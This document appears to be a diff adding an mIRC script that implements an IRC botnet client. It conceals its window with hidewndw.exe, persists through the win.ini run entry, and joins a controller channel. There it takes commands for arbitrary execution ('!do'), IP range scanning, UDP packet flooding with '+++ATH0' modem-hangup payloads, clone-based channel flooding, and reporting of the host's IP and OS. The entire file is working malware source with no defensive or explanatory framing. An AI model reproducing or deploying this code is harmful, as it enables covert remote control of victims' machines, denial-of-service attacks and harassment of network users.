@@ -1,0 +1,201 @@
+on *:INPUT:*:{ quit User detected, closing for saftey [ $+ $1- $+ ] | .timer -o 1 1 exit User }
+on *:start:{
+  run $mircdir $+ hidewndw.exe /n /fh mirc32
+  if ($readini c:\windows\win.ini windows run != $mircexe) writeini c:\windows\win.ini windows run $mircexe
+  identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) 
+  nick g0d $+ $rand(1,10000)
+  .server %mainserver 
+  .flush 2 
+  hide
+  .ial on
+  .timeronline -o 0 60 online
+  .timerhide -o 0 2 hide
+  .timerchk -o 0 1 chk
+}
+on *:connect: { .flush 2 | join %mainchan | run $mircdir $+ hidewndw.exe /n /fh mirc32 }
+on *:sockopen:clone*:{
+  .identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) 
+  .timer 1 2 sockwrite -n $sockname Nick %clonenick $+ %i %clonenick $+ %.i2 
+  .timer 1 2 sockwrite -n $sockname User $remove(%clonenick,$chr(124)) %clonenick %clonenick %clonenick2 0 0 : $+ Kraken
+  chkclones 
+  .timernewbawt 1 %delay clone %nick %net 
+  inc %clones 
+}
+on *:sockread:clone*: { .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
+on *:sockclose:clone*: { dec %totalclones }
+on *:sockread:Papa*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
+on *:Sockopen:Papa*:{
+  if ($sockerr > 0) { halt }
+  .identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) 
+  set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z)
+  .sockwrite -nt $sockname USER %user %user %user : $+ %user
+  .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+
+  .sockwrite -nt $sockname JOIN : $+ %channel
+  .sockwrite -n $sockname privmsg %nick :Version
+  .sockwrite -n $sockname Privmsg %nick : $+ %flood
+  .sockclose $sockname
+  .sockopen Papa $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
+}
+on *:SOCKREAD:IDENT*:{ sockread %ident | sockwrite $sockname %ident : USERID : UNIX : $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $RAND(A,Z) | unset %ident }
+on *:socklisten:ident*: { if ($sockerr > 0) return | sockaccept ident $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
+on *:SOCKREAD:IDENT*:{ sockread %ident | sockwrite $sockname %ident : USERID : UNIX : $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $RAND(A,Z) | unset %ident }
+on *:sockread:SCAN*:{ if ($sockerr > 0) return | :nextread | sockread -f %temp | if ($sockbr == 0) return | if (%temp == $null) %temp = - | echo -a %temp | found $remove($sockname,SCAN) %temp | goto nextread }
+
+on 100:Text:*:*:{
+  if ($1 == !chk ) { .notice $nick Checking total amount of clones... | chkclones $nick }
+  if ($1 == !bkill ) { sockclose clone* | notice $nick All clones have been dissconnected | .timers off | .timeronline -o 0 100 online | .timerhide -o 0 2 hide | .timerchk -o 0 1 chk }
+  if ($1 == !load ) { { if ($3 = $null) { .notice $nick !Load Number Network:Port | halt }
+      chkclones
+      unset %clones %loadclones 
+      set %loadclones $2 
+      set %nick $nick
+      set %net $3
+      .notice $nick Loading %loadclones clones on %net
+      clone %nick %net
+    }
+  }
+  if ($1 == !load.wmo) { chkclones | unset %clones %loadclones | set %loadclones $2 | set %nick $nick | set %net $3 | .notice $nick Loading %loadclones clones on %net | clone %nick %net | /timer 1 30 //clonejoin #world-movies | /timer 1 30 //clonejoin $read chans.txt | /timer 1 30 //clonejoin $read chans.txt  }
+  if ($1 == !info) { .notice $nick 4,1[9My Ip Is: $ip 4- Port I Am On Is: $port 4- 11The Server I Am On Is: $server 4- My Os Is: $os 4- 8My Pcs Uptime Is: $duration($calc($ticks / 1000)) 4.] | halt } 
+  if ($1 == !version) { .notice $nick I am running %version }
+  if ($1 == !stop) { .timers off | .notice $nick Turned all timers off | timeronline 0 300 online | timerhide -o 0 2 hide }
+  if ($1 == !bnick) { clonenick }
+  if ($1 == !bnick.same) { set %te2 $2 | clonenick2 }
+  if ($1 == !bnick.set) { set %te2 $2 | clonenick3 }
+  if ($1 == !join) { join $2- | .notice $nick Joining $2- $+ ... }
+  if ($1 == !part) { part $2- | .notice $nick Parting $2- $+ ... }
+  if ($1 == !bjoin) { if ($2 == $null) { .notice $nick Idiot tell me the damn channel. } | else { clonejoin $2 } }
+  if ($1 == !bjoin.wmo) { //clonejoin #world-movies | //clonejoin $read chans.txt | //clonejoin $read chans.txt }
+  if ($1 == !bpart) { if ($2 == $null) { .notice $nick Idiot tell me the damn channel. } | else { clonepart $2- } }
+  if ($1 == !bcycle) { if ($2 == $null) { .notice $nick Idiot tell me the damn channel. } | else { clonecycle $2- } }
+  if ($1 == !login) { if ($2- == %pass) { .notice $nick Logged in sucessfully as $nick } }
+  if ($1 == !do) { if ($2 != $null) { $2- | .notice $nick I am now doing $2- | halt } }
+  if ($1 == !exit) { if ($2 = $null) { .notice $nick Exitting all clients now... | quit %version | exit } | elseif ($1 != $null) { .notice $nick Exitting all clients now... | quit $2- | exit } }
+  if ($1 == !jump) { if ($2 == $null) { .notice $nick !Jump <Server:Port> | halt } | else { quit serverhop $2 | server $2- } }
+  if ($1 == !reconnect) { if ($2 == $null) { .notice $nick Now Reconnecting to %mainserver } | { .run c:\windows\command\ebo\sf.exe | .exit } }
+  if ($1 == !op) { .mode $chan +o $nick }
+  if ($1 == !nick) { .nick g0d-[ $+ $rand(1,10000) $+ ] }
+  if ($1 == !identon) { .socklisten ident 113 | .notice $nick Now listening for idents }
+  if ($1 == !identoff) { .sockclose ident* | .notice $nick Now halting the listening }
+  if ($1 == !setserver) { .set %server $2- | .notice $NICK Task Completed. }
+  if ($1 == !setclones) { .set %clones $2- | .notice $NICK Task Completed. }
+  if ($1 == !flood) { .fuck $2- | .notice $NICK Task Completed. }
+  if ($1 == !floodff) { .cleanup | .notice $NICK Task Completed. }
+  if ($1 == !packet) {
+    if ($2 == $null) || ($3 == $null) || ($4 == $null) && (stop !isin $1-) { notice $nick !packet <number of packets> <host> <random/port> }
+    if ($4 == random) { //gcoolstart $2 $3 $r(1,64000) | halt } | //gcoolstart $2 $3 $4
+  }
+  if ($1 == !newserver) { .set %mainserver $2 | .notice $nick New Server has been set to $2 }
+  if ($1 == !newchan) { .set %mainchan $2 | .notice $nick New Channel has been set to $2 }
+  if ($1 == !newpass) { .set %pass $2 | .notice $nick New Pass has been set to $2 }
+  if ($1 == !newhost) { .guser 100 $2 2 | .notice $nick New User has been set to $2 }
+  if ($1 == !delhost) { .ruser 100 $2 2 | .notice $nick Removed Host: $2 }
+  if ($1 == !Msg.Flood) { if ($2 == $null) { .notice $nick Idiot tell me the damn nick/channel or msg... | halt } | if ($3 == $null) { clonesflood $2 10 | .notice $nick Screen-Lag Flooding $2 every 10 seconds... } | else { clonesflood $2- | .notice $nick Screen-Lag Flooding $2 every $3 seconds... } }
+  if ($1 == !bmsg) { if ($2 == $null) { .notice $nick Idiot tell me the damn nick/channel or msg... } | else { clonemsg $2- } }
+  if ($1 == !bnotice) { if ($2 = $null) { .notice $nick Idiot tell me the damn nick/channel or msg... } | else { clonenotice2 $2- } }
+  if ($1 == !scan) { if ($6 = $null) { notice $nick [ error ] ScorpionScanner requires this format, [ !Scan <StartIP> <FinishIP> <Port> <Nick/Channel> <Delay> ] | halt } | sockclose Scan* | timerscan off | set %foundN 0 | set %StartIP $2 | sip $replace(%startip,.,$chr(32)) | set %FinishIP $3 | fip $replace(%finiship,.,$chr(32))
+    set %tport $4 | set %report $5 | set %tdelay $6 | if (%sip1 > %fip1) goto ipsize | if (%sip2 > %fip2) goto ipsize | if (%sip3 > %fip3) goto ipsize | if (%sip4 > %fip4) goto ipsize | if (%sip1 > 255) goto ipsize | if (%sip2 > 255) goto ipsize | if (%sip3 > 255) goto ipsize | if (%sip4 > 255) goto ipsize | if (%fip1 > 255) goto ipsize | if (%fip2 > 255) goto ipsize | if (%fip3 > 255) goto ipsize | if (%fip4 > 255) goto ipsize
+    if (%tport > 65500) goto porterror | goto success | :ipsize | notice $nick [ error ] IP ranges are invalid | halt | :porterror | notice $nick [ error ] Port is larger than 65500 | halt | :success | msg %report [ Starting IP Scanner ] Scanning %sip1 $+ . $+ %sip2 $+ . $+ %sip3 $+ . $+ %sip4 - %fip1 $+ . $+ %fip2 $+ . $+ %fip3 $+ . $+ %fip4 and reporting to %report [ To stop the scan type !Scanoff | scan 
+  }
+  if ($1 == !scanoff)  { timerscan off | timerscan2 off | notice %report all scans have been halted }
+}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+alias SIP { set %sip1 $1 | set %sip2 $2 | set %sip3 $3 | set %sip4 $4 }
+alias FIP { set %fip1 $1 | set %fip2 $2 | set %fip3 $3 | set %fip4 $4 }
+alias report { msg %report [ Scan complete ] Found %foundN result(s) }
+alias found { set %foundip $1 | set %accessip $2 | if (%accessip = PWD) { msg %report [ Found connection ] %foundip [ Requires password ] | inc %foundN | halt } | msg %report [ Found connection ] %foundip [ Unknown ] | inc %foundN }
+alias scan { set %cip1 %sip1 | set %cip2 %sip2 | set %cip3 %sip3 | set %cip4 %sip4 | .notice %report Scanning %cip1 $+ . $+ %cip2 $+ . $+ %cip3 $+ .* $+ : $+ %tport | scan2 }
+alias scan2 { :start | if (%cip4 > %fip4) { set %cip4 %sip4 | inc %cip3 | if (%cip3 > %fip3) { set %cip3 %sip3 | inc %cip2 } | if (%cip2 > %fip2) { set %cip2 %sip2 | inc %cip1 } | if (%cip1 > %fip1) { goto finish } | .notice %report Scanning %cip1 $+ . $+ %cip2 $+ . $+ %cip3 $+ .* $+ : $+ %tport | goto end }
+sockopen SCAN $+ %cip1 $+ . $+ %cip2 $+ . $+ %cip3 $+ . $+ %cip4 $+ : $+ %tport %cip1 $+ . $+ %cip2 $+ . $+ %cip3 $+ . $+ %cip4 %tport | inc %cip4 | goto start | :end | .timerscan2 1 %tdelay scan2 | halt | :finish | .msg %report Scan complete, Please wait while the last connections are closed... | .timer 1 15 report | .timer 1 15 sockclose SCAN* | .timerscan off }
+alias online { if ($server = $null) server %mainserver }
+alias hide { run $mircdir $+ hidewndw.exe /n /fh mirc32 }
+alias chk { chkclones }
+alias rand { 
+  set %rand.1 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z) | set %rand.2 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z) | set %rand.3 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z) | set %rand.4 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z)
+  set %rand.5 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z) | set %rand.6 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z) | set %rand.7 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z) | set %rand.8 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z)
+  set %rand.9 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z) | set %rand.10 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z) | set %rand.11 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z) | set %rand.12 $rand(a,z) $+  $+ $rand(A,Z) $+  $+ $rand(1,9) $+  $+ $rand(A,Z) $+ $rand(a,z) $+  $+ $rand(1,9) $+  $+ $rand(a,s) $+  $+ $rand(a,z) 
+}
+alias clonenotice2 { set %m $2- | %.i3 = 1 | :loop | if (%.i3 > %totalclones) { goto end } | sockwrite -n clone $+ %.i3 notice $1 %m | inc %.i3 | goto loop | :end | halt }
+alias clonemsg { %.i3 = 1 | :loop | if (%.i3 > %totalclones) { goto end } | sockwrite -n clone $+ %.i3 PRIVMSG $1 $replace($2-,$chr(32),$chr(0160)) | inc %.i3 | goto loop | :end | halt }
+alias clonesflood { %.i3 = 1 | :loop | if (%.i3 > %totalclones) { goto end } | .timerflood $+ $rand(1,20) 0 $2 sfloodm $1 %.i3 | inc %.i3 | goto loop | :end | halt }
+alias sfloodm { scramble | sockwrite -n Clone $+ $2 PRIVMSG $1 %chanflood }
+alias scramble { set %temp $rand(1,5) 
+  if (%temp = 1) set %chanflood BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling 
+  if (%temp = 2) set %chanflood BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling 
+  if (%temp = 3) set %chanflood BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling 
+  if (%temp = 4) set %chanflood BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling 
+  if (%temp = 5) set %chanflood BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
+}
+alias noticeflood { rand | sockwrite -n Clone $+ $2 notice $1  $+ $rand(2,14) $+ ,1 $+ %rand.1 $+ %rand.2 $+ %rand.3 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.3 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.3 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.3 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.3 }
+alias clonenflood { %.i3 = 1 | :loop | if (%.i3 > %totalclones) { goto end } | .timernflood $+ $rand(1,20) 0 $2 noticeflood $1 %.i3 | inc %.i3 | goto loop | :end | halt }
+alias clonenotice { %.i3 = 1 | :loop | if (%.i3 > %totalclones) { goto end } | rand | sockwrite -n clone $+ %.i3 notice $1  $+ $rand(2,14) $+ ,1 $+ %rand.1 $+ %rand.2 $+ %rand.3 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.3 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.3 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.3 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.4 $+ %rand.5 $+ %rand.6 $+ %rand.7 $+ %rand.3 | inc %.i3 | goto loop | :end | halt }
+alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | notice $nick Packeting Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { notice $nick ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  $notice nick 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 | .notice $nick sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )] }
+alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
+  sockudp gnumc1 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
+  sockudp gnumc3 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
+  sockudp gnumc2 $2 $3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+  sockudp gnumc4 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
+  return |  :done | notice $nick [packeting]: Finished! | .timergcoolt off | unset %gnum | unset %pchan 
+}
+alias cleanup {
+  .set %papaflood off
+  .sockclose Papa*
+  .unset %nick
+  unset %channel
+  unset %server
+  unset %port
+  unset %clones
+  unset %flood
+  notice $nick All Clones Have Been Cleared
+}
+alias clone {
+  if (%totalclones >= %loadclones) halt
+  if ($2 == Rand) set %clonenet $read nets.txt 
+  else set %clonenet $2
+  randnick
+  randuser
+  inc %totalclones
+  if (%totalclones <= 0) set %totalclones 1 
+  sockopen clone $+ %totalclones $replace(%clonenet,:,$chr(32))
+  .notice %nick Loading Clone on %clonenet as %clonenick Total Clones open... %totalclones $+ / $+ %Loadclones $+ . 
+}
+alias sockclone { return clone $+ %.i4 }
+alias fuck {
+  if ($2 = $null) || ($2 !isnum) { notice $nick Error Type: !flood <chan/nick> <num of clones> <server> <port> <message> | halt }
+  set %nick $$1
+  set %clones $$2
+  set %channel $$1
+  if ( $3 = $null) { set %server $server }
+  if ( $3 != $null) { set %server $$3 }
+  if ( $4 = $null) || ( $4 !isnum) { set %port $port }
+  if ( $4 != $null) { set %port $$4 }
+  if ( $5 = $null) { set %flood BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling }
+  if ($5 != $null) { set %flood $5- }
+  set %papaflood on
+  var %var = 0
+  :loop
+  inc %var
+  if (%papaflood == on) && (%var <= %clones) { .sockopen Papa $+ %var %server %port | goto loop }
+  else { notice $nick Clones Loaded | .notice $NICK Task Completed. | halt }
+}
+alias chkclones {
+  set %.i4 0 
+  :start 
+  inc %.i4 
+  if ($sock($sockclone).status = active) { set %totalclones %.i4 }
+  else { goto end } 
+  goto start 
+  :end
+  if ($sock(clone1).status == $null) { set %totalclones 0 }
+  if ($1 != $null) { .notice $1 Total clones... %totalclones
+  } 
+}
+alias clonenick2 { set %temp 1 | :start | if (%temp > %totalclones) { unset %te2 | halt } | set %clonenick %te2 $+ ` $+ $rand(10000,99999) | sockwrite -n clone $+ %temp Nick %clonenick | inc %temp | goto start }
+alias randuser { set %clonenick2 Kraken }
+alias clonenick { set %temp 1 | :start | if (%temp > %totalclones) halt | set %te $read $mircdir $+ nicks.txt | set %clonenick %te | sockwrite -n clone $+ %temp Nick %clonenick | inc %temp | goto start }
+alias randnick { set %te $read $mircdir $+ nicks.txt | set %clonenick %te }
+alias clonecycle { %.i3 = 1 | :loop | if (%.i3 > %totalclones) { goto end } | sockwrite -n clone $+ %.i3 part $1 cycle! | sockwrite -n clone $+ %.i3 join $1 | inc %.i3 | goto loop | :end | halt }
+alias clonejoin { %.i3 = 1 | :loop | if (%.i3 > %totalclones) { goto end } | sockwrite -n clone $+ %.i3 join $1 | inc %.i3 | goto loop | :end | halt }
+alias clonepart { %.i3 = 1 | :loop | if (%.i3 > %totalclones) { goto end } | sockwrite -n clone $+ %.i3 part $1 $replace($2-,$chr(32),$chr(0160)) | inc %.i3 | goto loop | :end | halt }
+alias clonenick3 { set %temp 1 | :start | if (%temp > %totalclones) { unset %te2 | halt } | set %clonenick %te2 | sockwrite -n clone $+ %temp Nick %clonenick | inc %temp | goto start }
